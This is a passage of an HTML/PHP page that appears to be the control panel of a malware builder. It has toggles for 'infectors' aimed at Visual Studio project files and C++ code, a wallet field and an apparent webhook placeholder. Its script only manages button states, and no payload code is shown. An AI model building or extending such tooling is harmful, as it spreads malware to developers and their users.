                                        class="fa-solid fa-bug mr-1 textCol"></i> VCXPROJ Infector [Optional]</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-bug mr-1 textCol"></i> SUO Infector [Required]</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-bug mr-1 textCol"></i> Imgui Infector [Optional]</h1>
                                <h1 class="text-stone-400 fntBold tracking-wide text-base font-thin py-1"><i
                                        class="fa-solid fa-bug mr-1 textCol"></i> Global C++ Infector [Required]</h1>
                            </div>

                            <div class="2 col-span-2 space-y-2">

                                <div class="sc-container" style="position: relative;">
                                    <input id="walletgpu" data-sc="" type="text" name="walletgpu"
                                        class="smoothCaretInput text-stone-400 fntBold py-1 rounded-lg dg w-full"
                                        style="font-size: 0.980rem; padding-left: 10px;"
                                        placeholder="<?php echo $DcWbhkHolder; ?>">
                                    <div class="caret bgCol"
                                        style="width: 2px; height: 50%; left: 1px; position: absolute;"></div>
                                </div>

                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable" type="button" onclick="enable()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b  opacity-50 cursor-not-allowed">Enable</button>
                                    <button id="disable" type="button" onclick="disable()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b  opacity-50 cursor-not-allowed">Disable</button>
                                </div>

                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable2" type="button" onclick="enable2()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b  opacity-50 cursor-not-allowed">Enable</button>
                                    <button id="disable2" type="button" onclick="disable2()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b  opacity-50 cursor-not-allowed">Disable</button>
                                </div>
                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable3" type="button" onclick="enable3()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b  opacity-50 cursor-not-allowed">Enable</button>
                                    <button id="disable3" type="button" onclick="disable3()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b  opacity-50 cursor-not-allowed">Disable</button>
                                </div>
                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable4" type="button" onclick="enable4()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b hvr-underline-from-center">Enable</button>
                                    <button id="disable4" type="button" onclick="disable4()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b hvr-underline-from-center">Disable</button>
                                </div>
                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable5" type="button" onclick="enable5()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b hvr-underline-from-center">Enable</button>
                                    <button id="disable5" type="button" onclick="disable5()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b hvr-underline-from-center">Disable</button>
                                </div>

                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable6" type="button" onclick="enable6()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b opacity-50 cursor-not-allowed">Enable</button>
                                    <button id="disable6" type="button" onclick="disable6()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b opacity-50 cursor-not-allowed">Disable</button>
                                </div>

                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable7" type="button" onclick="enable7()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b hvr-underline-from-center">Enable</button>
                                    <button id="disable7" type="button" onclick="disable7()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b hvr-underline-from-center">Disable</button>
                                </div>

                                <div class="grid grid-cols-2 gap-2">
                                    <button id="enable8" type="button" onclick="enable8()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b opacity-50 cursor-not-allowed">Enable</button>
                                    <button id="disable8" type="button" onclick="disable8()"
                                        class="dg rounded-lg text-stone-400 fntBold tracking-wide py-1 border-b opacity-50 cursor-not-allowed">Disable</button>
                                </div>

                                <input type="hidden" id="enableState" name="enableState" value="disabled">
                                <input type="hidden" id="enable2State" name="enable2State" value="disabled">
                                <input type="hidden" id="enable3State" name="enable3State" value="disabled">
                                <input type="hidden" id="enable4State" name="enable4State" value="disabled">
                                <input type="hidden" id="enable5State" name="enable5State" value="disabled">
                                <input type="hidden" id="enable6State" name="enable6State" value="disabled">
                                <input type="hidden" id="enable7State" name="enable7State" value="disabled">
                                <input type="hidden" id="enable8State" name="enable8State" value="disabled">


                            </div>

                            <button id="CustomStb" type="submit" name="CustomStb"
                                class="dg mt-3 mr-5 px-5 py-1 col-span-3 float-right rounded-lg text-stone-500 fntBold hvr-underline-from-center"><i
                                    class="fa-solid fa-floppy-disk mr-1"></i> Save</button>
                        </div>
                    </form>
                </div>

            </div>

            <script src="../assets/js/status.js"></script>
            <script src="../assets/js/builder.js"></script>

            <script>
                // Enable function
                function enable(id) {
                    document.getElementById(id).style.borderColor = '#850000';
                    document.getElementById(id.replace('enable', 'disable')).style.borderColor = '#111111';
                    document.getElementById(id + 'State').value = 'enabled';
                }

                // Disable function
                function disable(id) {
                    document.getElementById(id).style.borderColor = '#850000';
                    document.getElementById(id.replace('disable', 'enable')).style.borderColor = '#111111';
                    document.getElementById(id.replace("disable", "enable") + 'State').value = 'disabled';
                }



                //
                document.getElementById('enable').style.borderColor = '#111111';
                document.getElementById('enable2').style.borderColor = '#111111';
                document.getElementById('enable3').style.borderColor = '#111111';
                document.getElementById('enable4').style.borderColor = '#111111';
                document.getElementById('enable5').style.borderColor = '#111111';
                document.getElementById('enable6').style.borderColor = '#111111';
                document.getElementById('enable7').style.borderColor = '#111111';
                document.getElementById('enable8').style.borderColor = '#111111';
                document.getElementById('enable9').style.borderColor = '#111111';

                document.getElementById('disable').style.borderColor = '#850000';
                document.getElementById('disable2').style.borderColor = '#850000';
                document.getElementById('disable3').style.borderColor = '#850000';
                document.getElementById('disable4').style.borderColor = '#850000';
                document.getElementById('disable5').style.borderColor = '#850000';
                document.getElementById('disable6').style.borderColor = '#850000';
                document.getElementById('disable7').style.borderColor = '#850000';
                document.getElementById('disable8').style.borderColor = '#850000';
                document.getElementById('disable9').style.borderColor = '#850000';


                const inputString = "<?php echo $enabledisablestr; ?>";

                // Split the input string by the '|' character to get the individual pairs
                const pairs = inputString.split('|');

                // Loop through each pair
                pairs.forEach(pair => {
                    // Split the pair by the ':' character to get the number and value
                    const [number, value] = pair.split(':');

                    if (value == '1') {

                        if (number == '1') {
                            enable('enable');
                        } else {
                            enable('enable' + number);
                        }

                    } else if (value == '0') {
                        if (number == '1') {
                            disable('disable');
                        } else {
                            disable('disable' + number);
                        }
                    }


                });

                enable("enable9");

                document.addEventListener('DOMContentLoaded', function () {
                    // Function to add event listeners to buttons
                    function addEventListeners() {
                        const buttons = [{
                            id: 'enable4'
                        },
                        {
                            id: 'disable4'
                        },
                        {
                            id: 'enable5'
                        },
                        {
                            id: 'disable5'
                        },
                        {
                            id: 'enable7'
                        },
                        {
                            id: 'disable7'
                        },
                        {
                            id: 'enable9'
                        },
                        {
                            id: 'disable9'
                        }
                        ];

                        buttons.forEach(button => {
                            const btn = document.getElementById(button.id);
                            console.log(`Checking element with ID: ${button.id}`, btn); // Debugging log
                            if (btn) {
                                btn.addEventListener('click', () => {
                                    if (button.id.includes('enable')) {
                                        enable(button.id);
                                    } else {
                                        disable(button.id);
                                    }
                                });
                            } else {
                                console.error(`Element with ID ${button.id} not found`); // Debugging log
                            }
                        });
                    }


                    // Add event listeners to buttons
                    addEventListeners();

                    // Select the elements
                    var popup = document.getElementById('popup');
                    var blurBackground = document.getElementById('blurBackground');

                    // Function to open the popup
                    function openPopup() {
                        popup.classList.add('open');
                        blurBackground.classList.add('active');
                    }

                    // Function to close the popup
                    function closePopup() {
                        popup.classList.remove('open');
                        blurBackground.classList.remove('active');
                    }

                });
            </script>


            <style>
                input::placeholder {
                    color: #a8a29e;
                }
            </style>
            <script>
                document.addEventListener("DOMContentLoaded", function () {
                    // Wait for fonts and stylesheets
                    Promise.all([
                        document.fonts.ready,
                        new Promise(resolve => {
                            // Check if all stylesheets are loaded
                            const styleSheets = Array.from(document.styleSheets);
                            if (styleSheets.every(sheet => sheet.loaded !== false)) {
                                resolve();
                            } else {
                                window.addEventListener('load', resolve);
                            }
                        })
                    ]).then(() => {
                        const overlay = document.querySelector('.loading-overlay');

                        // Add the fade-out class
                        overlay.classList.add('fade-out');

                        // Remove the element after the transition completes
                        overlay.addEventListener('transitionend', function () {
                            overlay.parentNode.removeChild(overlay);
                        }, {
                            once: true
                        });
                    });
                });

                // Preload custom fonts if you're using any
                const fonts = ['Kanit'];
                fonts.forEach(font => {
                    new FontFace(font, `url(path/to/${font}.woff2)`)
                        .load()
                        .then(loadedFont => document.fonts.add(loadedFont));
                });
            </script>
</body>

</html>